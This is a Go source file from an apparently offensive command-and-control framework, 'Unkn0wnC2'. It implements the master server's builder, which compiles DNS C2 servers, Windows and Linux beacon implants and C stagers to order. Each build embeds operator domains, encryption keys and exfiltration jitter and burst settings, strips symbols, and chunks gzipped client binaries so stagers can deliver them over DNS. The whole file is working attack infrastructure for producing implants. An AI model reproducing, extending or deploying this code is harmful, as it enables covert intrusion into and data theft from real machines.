// Package main implements the builder functionality for Unkn0wnC2 Master Server.
// This file handles on-demand compilation of DNS servers, clients, and stagers.
package main

import (
	"bytes"
	"compress/gzip"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

const (
	buildsDir = "/opt/unkn0wnc2/builds" // Directory to store compiled binaries
)

var (
	// buildMutex prevents concurrent builds from interfering with each other
	buildMutex sync.Mutex
)

// Builder request structures
type DNSServerBuildRequest struct {
	Domain        string `json:"domain"`
	NS1           string `json:"ns1"`
	NS2           string `json:"ns2"`
	UpstreamDNS   string `json:"upstream_dns"`
	ServerAddress string `json:"server_address"`
	EncryptionKey string `json:"encryption_key"`
}

type ClientBuildRequest struct {
	DNSDomains          []string `json:"dns_domains"`
	Platform            string   `json:"platform"`
	SleepMin            int      `json:"sleep_min"`
	SleepMax            int      `json:"sleep_max"`
	ExfilJitterMinMs    int      `json:"exfil_jitter_min_ms"`
	ExfilJitterMaxMs    int      `json:"exfil_jitter_max_ms"`
	ExfilChunksPerBurst int      `json:"exfil_chunks_per_burst"`
	ExfilBurstPauseMs   int      `json:"exfil_burst_pause_ms"`
}

type StagerBuildRequest struct {
	ClientBinaryID string `json:"client_binary_id"` // ID of pre-built client to use
	Domain         string `json:"domain"`           // Primary DNS domain (for single-server mode)
	Platform       string `json:"platform"`
	PayloadURL     string `json:"payload_url"`
	JitterMinMs    int    `json:"jitter_min_ms"`
	JitterMaxMs    int    `json:"jitter_max_ms"`
	ChunksPerBurst int    `json:"chunks_per_burst"`
	BurstPauseMs   int    `json:"burst_pause_ms"`
}

// Web UI handler for builder page
func (api *APIServer) handleBuilderPage(w http.ResponseWriter, r *http.Request) {
	http.ServeFile(w, r, filepath.Join(api.config.WebRoot, "builder.html"))
}

// handleBuildDNSServer builds a DNS server binary with provided configuration
func (api *APIServer) handleBuildDNSServer(w http.ResponseWriter, r *http.Request) {
	// Acquire build lock to prevent concurrent builds from interfering
	buildMutex.Lock()
	defer buildMutex.Unlock()

	var req DNSServerBuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate required fields
	if req.Domain == "" {
		api.sendError(w, http.StatusBadRequest, "domain is required")
		return
	}

	if req.ServerAddress == "" {
		api.sendError(w, http.StatusBadRequest, "server address is required for A records")
		return
	}

	// Auto-generate NS1 and NS2 from domain if not provided
	if req.NS1 == "" {
		req.NS1 = "ns1." + req.Domain
	}
	if req.NS2 == "" {
		req.NS2 = "ns2." + req.Domain
	}

	// Use Master's global encryption key for all C2 communications
	// This ensures all DNS servers and clients use the same key
	req.EncryptionKey = api.config.EncryptionKey
	if req.EncryptionKey == "" {
		api.sendError(w, http.StatusInternalServerError, "encryption key not configured in Master config")
		return
	}

	// Generate API key for this DNS server
	apiKeyBytes := make([]byte, 16)
	rand.Read(apiKeyBytes)
	apiKey := hex.EncodeToString(apiKeyBytes)

	// NOTE: Don't register in DB until build succeeds - see below
	serverID := fmt.Sprintf("dns-%d", time.Now().Unix())

	// Get master server URL from config
	// If BindAddr is 0.0.0.0, we need the actual hostname/IP
	// For now, use the request's Host header or fallback to BindAddr
	masterHost := api.config.BindAddr
	if masterHost == "0.0.0.0" || masterHost == "" {
		// Try to get from request
		if r.Host != "" {
			// Strip port if present
			if colonIdx := strings.Index(r.Host, ":"); colonIdx > 0 {
				masterHost = r.Host[:colonIdx]
			} else {
				masterHost = r.Host
			}
		} else {
			// Fallback - this might not work but it's better than 0.0.0.0
			masterHost = "localhost"
		}
	}
	masterURL := fmt.Sprintf("https://%s:%d", masterHost, api.config.BindPort)

	// Build the server
	binaryPath, err := api.buildDNSServer(req, masterURL, apiKey, serverID)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
		return
	}
	// Clean up build directory (which contains the binary) after we're done with everything
	buildDir := filepath.Dir(binaryPath)
	defer os.RemoveAll(buildDir)

	fmt.Printf("✓ DNS server build completed: %s\n", binaryPath)

	// Register DNS server in database ONLY after successful build
	err = api.db.RegisterDNSServer(serverID, req.Domain, req.ServerAddress, apiKey)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to register DNS server: %v", err))
		return
	}

	fmt.Printf("✓ DNS server registered in database: %s\n", serverID)

	// Save binary to builds directory
	filename := fmt.Sprintf("dns-server-%s-%d", req.Domain, time.Now().Unix())
	savedPath, err := api.saveBuild(binaryPath, filename, "dns-server")
	if err != nil {
		// Log but don't fail - still send the binary
		fmt.Printf("Warning: failed to save build: %v\n", err)
	} else {
		fmt.Printf("✓ Build saved to: %s\n", savedPath)
	}

	// Get file info for Content-Length header
	fileInfo, err := os.Stat(binaryPath)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to stat binary")
		return
	}

	// Send binary as download with proper headers
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"dns-server-%s\"", req.Domain))
	w.Header().Set("Content-Length", fmt.Sprintf("%d", fileInfo.Size()))

	file, err := os.Open(binaryPath)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to read binary")
		return
	}
	defer file.Close()

	written, err := io.Copy(w, file)
	if err != nil {
		fmt.Printf("Error streaming binary: %v\n", err)
		return
	}

	fmt.Printf("✓ Binary sent successfully: %d bytes\n", written)
}

// handleBuildClient builds a client binary with provided configuration
func (api *APIServer) handleBuildClient(w http.ResponseWriter, r *http.Request) {
	// Acquire build lock to prevent concurrent builds from interfering
	buildMutex.Lock()
	defer buildMutex.Unlock()

	var req ClientBuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate
	if len(req.DNSDomains) == 0 {
		api.sendError(w, http.StatusBadRequest, "at least one DNS domain is required")
		return
	}

	// Build the client
	// Build the client with Master's encryption key
	binaryPath, err := buildClient(req, api.config.SourceDir, api.config.EncryptionKey)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
		return
	}
	// Clean up build directory after we're done
	buildDir := filepath.Dir(binaryPath)
	defer os.RemoveAll(buildDir)

	// Save binary to builds directory
	ext := ""
	if req.Platform == "windows" {
		ext = ".exe"
	}
	filename := fmt.Sprintf("beacon-%s-%d%s", req.Platform, time.Now().Unix(), ext)
	savedPath, err := api.saveBuild(binaryPath, filename, "client")
	if err != nil {
		fmt.Printf("Warning: failed to save build: %v\n", err)
	} else {
		fmt.Printf("Build saved to: %s\n", savedPath)
	}

	// Store client binary in database for stager use
	if err := api.storeClientBinaryForStager(binaryPath, filename, req, savedPath); err != nil {
		fmt.Printf("Warning: failed to store client binary in database: %v\n", err)
	}

	// Send binary as download
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"beacon-%s%s\"", req.Platform, ext))

	file, err := os.Open(binaryPath)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to read binary")
		return
	}
	defer file.Close()

	io.Copy(w, file)
}

// handleBuildStager builds a stager binary with provided configuration
func (api *APIServer) handleBuildStager(w http.ResponseWriter, r *http.Request) {
	// Acquire build lock to prevent concurrent builds from interfering
	buildMutex.Lock()
	defer buildMutex.Unlock()

	var req StagerBuildRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		api.sendError(w, http.StatusBadRequest, "invalid request body")
		return
	}

	// Validate - in Shadow Mesh mode, client_binary_id is required
	if req.ClientBinaryID != "" {
		// Verify client binary exists
		_, err := api.db.GetClientBinary(req.ClientBinaryID)
		if err != nil {
			api.sendError(w, http.StatusBadRequest, "invalid client_binary_id: client binary not found")
			return
		}
		fmt.Printf("[Builder] Building stager for client binary: %s\n", req.ClientBinaryID)
	} else if req.Domain == "" {
		// Standalone mode requires domain
		api.sendError(w, http.StatusBadRequest, "either client_binary_id or domain is required")
		return
	}

	// Build the stager
	binaryPath, err := buildStager(req, api.config.SourceDir)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("build failed: %v", err))
		return
	}
	buildDir := filepath.Dir(binaryPath)
	defer os.RemoveAll(buildDir)

	// Save binary to builds directory
	ext := ""
	if req.Platform == "windows" {
		ext = ".exe"
	}
	filename := fmt.Sprintf("stager-%s-%d%s", req.Platform, time.Now().Unix(), ext)
	savedPath, err := api.saveBuild(binaryPath, filename, "stager")
	if err != nil {
		fmt.Printf("Warning: failed to save build: %v\n", err)
	} else {
		fmt.Printf("Build saved to: %s\n", savedPath)
	}

	// Send binary as download
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"stager-%s%s\"", req.Platform, ext))

	file, err := os.Open(binaryPath)
	if err != nil {
		api.sendError(w, http.StatusInternalServerError, "failed to read binary")
		return
	}
	defer file.Close()

	io.Copy(w, file)
}

// buildDNSServer compiles a DNS server with embedded configuration
func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKey, serverID string) (string, error) {
	// Create temporary directory for build
	buildDir, err := os.MkdirTemp("", "dns-server-build-*")
	if err != nil {
		return "", fmt.Errorf("failed to create build directory: %w", err)
	}
	// NOTE: Caller is responsible for cleanup of buildDir

	// Copy Server source files to build directory
	serverSrcDir := filepath.Join(api.config.SourceDir, "Server")
	fmt.Printf("Debug: Copying Server source from: %s\n", serverSrcDir)

	// Verify source directory exists
	if _, err := os.Stat(serverSrcDir); os.IsNotExist(err) {
		return "", fmt.Errorf("server source directory not found: %s\nEnsure 'source_dir' is set correctly in config and files were copied during installation", serverSrcDir)
	}

	if err := copyDir(serverSrcDir, buildDir); err != nil {
		return "", fmt.Errorf("failed to copy source: %w", err)
	}

	fmt.Printf("Debug: Copied to build dir: %s\n", buildDir)

	// Update config.go with embedded configuration
	configPath := filepath.Join(buildDir, "config.go")

	// Verify config.go exists after copy
	if _, err := os.Stat(configPath); os.IsNotExist(err) {
		// List what we have
		entries, _ := os.ReadDir(buildDir)
		var files []string
		for _, e := range entries {
			files = append(files, e.Name())
		}
		return "", fmt.Errorf("config.go not found in build directory after copy\nFiles present: %v\nSource: %s", files, serverSrcDir)
	}

	config, err := os.ReadFile(configPath)
	if err != nil {
		return "", fmt.Errorf("failed to read config: %w", err)
	}

	// Replace embedded config values in tryLoadEmbeddedConfig()
	// Note: Config uses specific alignment with tabs - must match exactly
	// Note: Replace ALL occurrences since there may be DefaultConfig() and tryLoadEmbeddedConfig()
	configStr := string(config)

	// Debug: Show what we're looking for and replacing
	fmt.Printf("Debug: MasterServer before replacement contains empty: %v\n", strings.Contains(configStr, "MasterServer:   \"\","))
	fmt.Printf("Debug: Replacing MasterServer with: %s\n", masterURL)

	configStr = strings.ReplaceAll(configStr, "Domain:        \"secwolf.net\",", fmt.Sprintf("Domain:        \"%s\",", req.Domain))
	configStr = strings.ReplaceAll(configStr, "NS1:           \"ns1.secwolf.net\",", fmt.Sprintf("NS1:           \"%s\",", req.NS1))
	configStr = strings.ReplaceAll(configStr, "NS2:           \"ns2.secwolf.net\",", fmt.Sprintf("NS2:           \"%s\",", req.NS2))
	configStr = strings.ReplaceAll(configStr, "UpstreamDNS:   \"8.8.8.8:53\",", fmt.Sprintf("UpstreamDNS:   \"%s\",", req.UpstreamDNS))
	configStr = strings.ReplaceAll(configStr, "EncryptionKey: \"MySecretC2Key123!@#DefaultChange\",", fmt.Sprintf("EncryptionKey: \"%s\",", req.EncryptionKey))
	if req.ServerAddress != "" {
		configStr = strings.ReplaceAll(configStr, "SvrAddr:       \"98.90.218.70\",", fmt.Sprintf("SvrAddr:       \"%s\",", req.ServerAddress))
	}
	// Set distributed mode config (required fields) - replace ALL occurrences
	configStr = strings.ReplaceAll(configStr, "MasterServer:   \"\",", fmt.Sprintf("MasterServer:   \"%s\",", masterURL))
	configStr = strings.ReplaceAll(configStr, "MasterAPIKey:   \"\",", fmt.Sprintf("MasterAPIKey:   \"%s\",", apiKey))
	configStr = strings.ReplaceAll(configStr, "MasterServerID: \"dns1\",", fmt.Sprintf("MasterServerID: \"%s\",", serverID))

	// Debug: Verify MasterServer was set after replacement
	fmt.Printf("Debug: MasterServer after replacement still empty: %v\n", strings.Contains(configStr, "MasterServer:   \"\","))

	if err := os.WriteFile(configPath, []byte(configStr), 0644); err != nil {
		return "", fmt.Errorf("failed to write config: %w", err)
	}

	// Debug: Verify MasterServer was set
	if debugMode := false; debugMode {
		if strings.Contains(configStr, "MasterServer:   \"\",") {
			fmt.Println("WARNING: MasterServer still empty after replacement!")
		} else {
			fmt.Printf("✓ MasterServer set to: %s\n", masterURL)
		}
	}

	// Clean and download dependencies to ensure compatible versions
	modTidyCmd := exec.Command("go", "mod", "tidy")
	modTidyCmd.Dir = buildDir
	modTidyCmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")
	if output, err := modTidyCmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("go mod tidy failed: %w\nOutput: %s", err, string(output))
	}

	// Build binary to temp location
	outputPath := filepath.Join(buildDir, "dns-server")
	fmt.Printf("Building DNS server to: %s\n", outputPath)

	cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", outputPath, ".")
	cmd.Dir = buildDir
	cmd.Env = append(os.Environ(), "GOOS=linux", "GOARCH=amd64")

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
	}

	fmt.Printf("Build command completed. Output: %s\n", string(output))

	// Verify binary was created
	if _, err := os.Stat(outputPath); os.IsNotExist(err) {
		// List directory contents for debugging
		entries, _ := os.ReadDir(buildDir)
		var fileList []string
		for _, e := range entries {
			fileList = append(fileList, e.Name())
		}
		return "", fmt.Errorf("build succeeded but binary not found at %s\nDirectory contents: %v\nBuild output: %s",
			outputPath, fileList, string(output))
	}

	fmt.Printf("Binary verified at: %s\n", outputPath)
	return outputPath, nil
}

// buildClient compiles a client with embedded configuration
func buildClient(req ClientBuildRequest, sourceRoot, encryptionKey string) (string, error) {
	// Create temporary directory for build
	buildDir, err := os.MkdirTemp("", "client-build-*")
	if err != nil {
		return "", fmt.Errorf("failed to create build directory: %w", err)
	}
	// NOTE: Caller is responsible for cleanup of buildDir

	// Copy Client source files
	clientSrcDir := filepath.Join(sourceRoot, "Client")
	fmt.Printf("Debug: Copying Client source from: %s\n", clientSrcDir)

	// Verify source directory exists
	if _, err := os.Stat(clientSrcDir); os.IsNotExist(err) {
		return "", fmt.Errorf("client source directory not found: %s\nEnsure 'source_dir' is set correctly in config and files were copied during installation", clientSrcDir)
	}

	if err := copyDir(clientSrcDir, buildDir); err != nil {
		return "", fmt.Errorf("failed to copy source: %w", err)
	}

	fmt.Printf("Debug: Copied to build dir: %s\n", buildDir)

	// List files to verify what was copied
	entries, _ := os.ReadDir(buildDir)
	fmt.Printf("Debug: Files in build dir: ")
	for _, e := range entries {
		fmt.Printf("%s ", e.Name())
	}
	fmt.Println()

	// Generate config.go from scratch (don't rely on existing file)
	configPath := filepath.Join(buildDir, "config.go")

	// Format DNS domains array
	domainsStr := "[]string{"
	for i, domain := range req.DNSDomains {
		if i > 0 {
			domainsStr += ", "
		}
		domainsStr += fmt.Sprintf(`"%s"`, domain)
	}
	domainsStr += "}"

	// Generate the complete config.go file with Master's encryption key
	configContent := fmt.Sprintf(`package main

// This file is auto-generated at build time by the Master builder
// DO NOT EDIT MANUALLY

// embeddedConfig contains the configuration embedded at build time
var embeddedConfig = Config{
	ServerDomain:         "secwolf.net",
	DNSDomains:          %s,
	DomainSelectionMode: "random",
	DNSServer:            "",
	QueryType:            "TXT",
	Encoding:             "aes-gcm-base36",
	EncryptionKey:        %q,
	Timeout:              10,
	MaxCommandLength:     400,
	RetryAttempts:        3,
	SleepMin:             %d,
	SleepMax:             %d,
	ExfilJitterMinMs:     %d,
	ExfilJitterMaxMs:     %d,
	ExfilChunksPerBurst:  %d,
	ExfilBurstPauseMs:    %d,
}

// getConfig returns the embedded configuration
func getConfig() Config {
	return embeddedConfig
}
`, domainsStr, encryptionKey, req.SleepMin, req.SleepMax, req.ExfilJitterMinMs,
		req.ExfilJitterMaxMs, req.ExfilChunksPerBurst, req.ExfilBurstPauseMs)

	if err := os.WriteFile(configPath, []byte(configContent), 0644); err != nil {
		return "", fmt.Errorf("failed to write config: %w", err)
	}

	fmt.Printf("Debug: Generated config.go with %d DNS domains\n", len(req.DNSDomains)) // Clean and download dependencies
	modTidyCmd := exec.Command("go", "mod", "tidy")
	modTidyCmd.Dir = buildDir
	if output, err := modTidyCmd.CombinedOutput(); err != nil {
		return "", fmt.Errorf("go mod tidy failed: %w\nOutput: %s", err, string(output))
	}

	// Build binary to temp location
	ext := ""
	goos := "linux"
	if req.Platform == "windows" {
		ext = ".exe"
		goos = "windows"
	}

	outputPath := filepath.Join(buildDir, fmt.Sprintf("beacon%s", ext))
	cmd := exec.Command("go", "build", "-trimpath", "-ldflags=-s -w", "-o", outputPath, ".")
	cmd.Dir = buildDir
	cmd.Env = append(os.Environ(), fmt.Sprintf("GOOS=%s", goos), "GOARCH=amd64")

	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
	}

	// Verify binary was created
	if _, err := os.Stat(outputPath); os.IsNotExist(err) {
		return "", fmt.Errorf("build succeeded but binary not found at %s\nBuild output: %s", outputPath, string(output))
	}

	return outputPath, nil
}

// buildStager compiles a stager with embedded configuration
func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
	// Stager is in C, needs different build process
	// Create temporary directory
	buildDir, err := os.MkdirTemp("", "stager-build-*")
	if err != nil {
		return "", fmt.Errorf("failed to create build directory: %w", err)
	}
	// NOTE: Caller is responsible for cleanup of buildDir

	// Copy Stager source files
	stagerSrcDir := filepath.Join(sourceRoot, "Stager")
	if err := copyDir(stagerSrcDir, buildDir); err != nil {
		return "", fmt.Errorf("failed to copy source: %w", err)
	}

	// Update stager.c with domain and timing configuration
	stagerPath := filepath.Join(buildDir, "stager.c")
	stagerCode, err := os.ReadFile(stagerPath)
	if err != nil {
		return "", fmt.Errorf("failed to read stager.c: %w", err)
	}

	codeStr := string(stagerCode)
	// Note: stager.c has extra spaces and comments - must match exactly
	codeStr = strings.Replace(codeStr, `#define C2_DOMAIN "secwolf.net"`, fmt.Sprintf(`#define C2_DOMAIN "%s"`, req.Domain), 1)
	codeStr = strings.Replace(codeStr, `#define MIN_CHUNK_DELAY_MS 60000`, fmt.Sprintf(`#define MIN_CHUNK_DELAY_MS %d`, req.JitterMinMs), 1)
	codeStr = strings.Replace(codeStr, `#define MAX_CHUNK_DELAY_MS 120000`, fmt.Sprintf(`#define MAX_CHUNK_DELAY_MS %d`, req.JitterMaxMs), 1)
	codeStr = strings.Replace(codeStr, `#define CHUNKS_PER_BURST 5`, fmt.Sprintf(`#define CHUNKS_PER_BURST %d`, req.ChunksPerBurst), 1)
	codeStr = strings.Replace(codeStr, `#define BURST_PAUSE_MS 120000`, fmt.Sprintf(`#define BURST_PAUSE_MS %d`, req.BurstPauseMs), 1)

	if err := os.WriteFile(stagerPath, []byte(codeStr), 0644); err != nil {
		return "", fmt.Errorf("failed to write stager.c: %w", err)
	}

	// Build using direct gcc/mingw compilation (no make required)
	ext := ""
	var cmd *exec.Cmd
	outputPath := filepath.Join(buildDir, fmt.Sprintf("stager-%s-x64%s", req.Platform, ext))

	if req.Platform == "windows" {
		ext = ".exe"
		outputPath = filepath.Join(buildDir, fmt.Sprintf("stager-%s-x64%s", req.Platform, ext))

		// Windows: Use mingw-w64 cross-compiler
		// Windows stagers don't use compression (no -lz needed)
		cmd = exec.Command("x86_64-w64-mingw32-gcc",
			"-Wall", "-O2", "-s",
			"stager.c",
			"-o", filepath.Base(outputPath),
			"-lws2_32", "-static")
	} else {
		// Linux: Use standard gcc
		// Try to build with zlib support, but if that fails, we can fallback
		// Note: zlib.h is needed for Linux builds - install zlib1g-dev if missing
		cmd = exec.Command("gcc",
			"-Wall", "-O2", "-s", "-m64",
			"stager.c",
			"-o", filepath.Base(outputPath),
			"-lz")

		// TODO: If zlib is not available, could add -D_WIN32 to disable compression
		// but that's a workaround - better to install zlib1g-dev on build system
	}

	cmd.Dir = buildDir
	output, err := cmd.CombinedOutput()
	if err != nil {
		// Provide helpful error for missing zlib
		if strings.Contains(string(output), "zlib.h: No such file or directory") {
			return "", fmt.Errorf("build failed: zlib development headers not found\n"+
				"Install with: sudo apt-get install zlib1g-dev\n"+
				"Original error: %w\nOutput: %s", err, string(output))
		}
		return "", fmt.Errorf("build failed: %w\nOutput: %s", err, string(output))
	} // Verify binary was created
	if _, err := os.Stat(outputPath); os.IsNotExist(err) {
		return "", fmt.Errorf("build succeeded but binary not found at %s\nBuild output: %s", outputPath, string(output))
	}

	return outputPath, nil
}

// Helper functions

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		relPath, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}

		targetPath := filepath.Join(dst, relPath)

		if info.IsDir() {
			return os.MkdirAll(targetPath, info.Mode())
		}

		return copyFile(path, targetPath)
	})
}

func copyFile(src, dst string) error {
	sourceFile, err := os.Open(src)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	return err
}

// saveBuild saves a compiled binary to the builds directory
func (api *APIServer) saveBuild(sourcePath, filename, buildType string) (string, error) {
	// Ensure builds directory exists
	typeDir := filepath.Join(buildsDir, buildType)
	if err := os.MkdirAll(typeDir, 0755); err != nil {
		return "", fmt.Errorf("failed to create builds directory: %w", err)
	}

	// Copy binary to builds directory
	destPath := filepath.Join(typeDir, filename)
	if err := copyFile(sourcePath, destPath); err != nil {
		return "", fmt.Errorf("failed to copy binary: %w", err)
	}

	return destPath, nil
}

// storeClientBinaryForStager compresses, encodes, chunks, and stores client binary for stager deployment
func (api *APIServer) storeClientBinaryForStager(binaryPath, filename string, req ClientBuildRequest, savedPath string) error {
	// Read binary file
	clientData, err := os.ReadFile(binaryPath)
	if err != nil {
		return fmt.Errorf("failed to read binary: %w", err)
	}

	originalSize := len(clientData)

	// Compress with gzip
	var compressedBuf bytes.Buffer
	gzWriter := gzip.NewWriter(&compressedBuf)
	if _, err := gzWriter.Write(clientData); err != nil {
		return fmt.Errorf("failed to compress: %w", err)
	}
	gzWriter.Close()

	compressed := compressedBuf.Bytes()
	compressedSize := len(compressed)

	// Base64 encode
	base64Data := base64.StdEncoding.EncodeToString(compressed)
	base64Size := len(base64Data)

	// Calculate chunks
	const chunkSize = 403
	totalChunks := (base64Size + chunkSize - 1) / chunkSize

	// Join DNS domains
	dnsDomains := strings.Join(req.DNSDomains, ",")

	// Get operator ID from JWT (if available)
	createdBy := "system"
	// TODO: Extract from JWT if needed

	// Generate ID
	binaryID := fmt.Sprintf("client_%d", time.Now().UnixNano())

	// Store in database
	err = api.db.SaveClientBinary(
		binaryID,
		filename,
		req.Platform,
		"x64", // Default arch
		"",    // Version - could be extracted from build or config
		base64Data,
		dnsDomains,
		originalSize,
		compressedSize,
		base64Size,
		chunkSize,
		totalChunks,
		createdBy,
	)

	if err != nil {
		return fmt.Errorf("failed to save to database: %w", err)
	}

	fmt.Printf("[Builder] Client binary stored for stager: %s (%d bytes → %d chunks)\n",
		binaryID, originalSize, totalChunks)

	return nil
}

// Build represents a saved build
type Build struct {
	Name      string    `json:"name"`
	Type      string    `json:"type"`
	Size      int64     `json:"size"`
	Timestamp time.Time `json:"timestamp"`
	Path      string    `json:"path"`
}

// handleListBuilds returns a list of all saved builds
func (api *APIServer) handleListBuilds(w http.ResponseWriter, r *http.Request) {
	builds := []Build{}

	// Walk through builds directory
	buildTypes := []string{"dns-server", "client", "stager"}
	for _, buildType := range buildTypes {
		typeDir := filepath.Join(buildsDir, buildType)

		entries, err := os.ReadDir(typeDir)
		if err != nil {
			if !os.IsNotExist(err) {
				fmt.Printf("Warning: failed to read %s directory: %v\n", buildType, err)
			}
			continue
		}

		for _, entry := range entries {
			if entry.IsDir() {
				continue
			}

			info, err := entry.Info()
			if err != nil {
				continue
			}

			builds = append(builds, Build{
				Name:      entry.Name(),
				Type:      buildType,
				Size:      info.Size(),
				Timestamp: info.ModTime(),
				Path:      filepath.Join(buildType, entry.Name()),
			})
		}
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(builds)
}

// handleDownloadBuild downloads a previously saved build
func (api *APIServer) handleDownloadBuild(w http.ResponseWriter, r *http.Request) {
	// Get build path from query parameter
	buildPath := r.URL.Query().Get("path")
	if buildPath == "" {
		api.sendError(w, http.StatusBadRequest, "path parameter is required")
		return
	}

	// Sanitize path to prevent directory traversal
	buildPath = filepath.Clean(buildPath)
	if strings.Contains(buildPath, "..") {
		api.sendError(w, http.StatusBadRequest, "invalid path")
		return
	}

	// Construct full path
	fullPath := filepath.Join(buildsDir, buildPath)

	// Check if file exists
	info, err := os.Stat(fullPath)
	if err != nil {
		if os.IsNotExist(err) {
			api.sendError(w, http.StatusNotFound, "build not found")
			return
		}
		api.sendError(w, http.StatusInternalServerError, "failed to access build")
		return
	}

	if info.IsDir() {
		api.sendError(w, http.StatusBadRequest, "path is a directory")
		return
	}

	// Send file
	w.Header().Set("Content-Type", "application/octet-stream")
	w.Header().Set("Content-Disposition", fmt.Sprintf("attachment; filename=\"%s\"", filepath.Base(buildPath)))
	http.ServeFile(w, r, fullPath)
}

// handleDeleteBuild deletes a saved build
func (api *APIServer) handleDeleteBuild(w http.ResponseWriter, r *http.Request) {
	// Get build path from query parameter
	buildPath := r.URL.Query().Get("path")
	if buildPath == "" {
		api.sendError(w, http.StatusBadRequest, "path parameter is required")
		return
	}

	// Sanitize path to prevent directory traversal
	buildPath = filepath.Clean(buildPath)
	if strings.Contains(buildPath, "..") {
		api.sendError(w, http.StatusBadRequest, "invalid path")
		return
	}

	// Construct full path
	fullPath := filepath.Join(buildsDir, buildPath)

	// Delete file
	if err := os.Remove(fullPath); err != nil {
		if os.IsNotExist(err) {
			api.sendError(w, http.StatusNotFound, "build not found")
			return
		}
		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to delete build: %v", err))
		return
	}

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]string{"status": "deleted"})
}
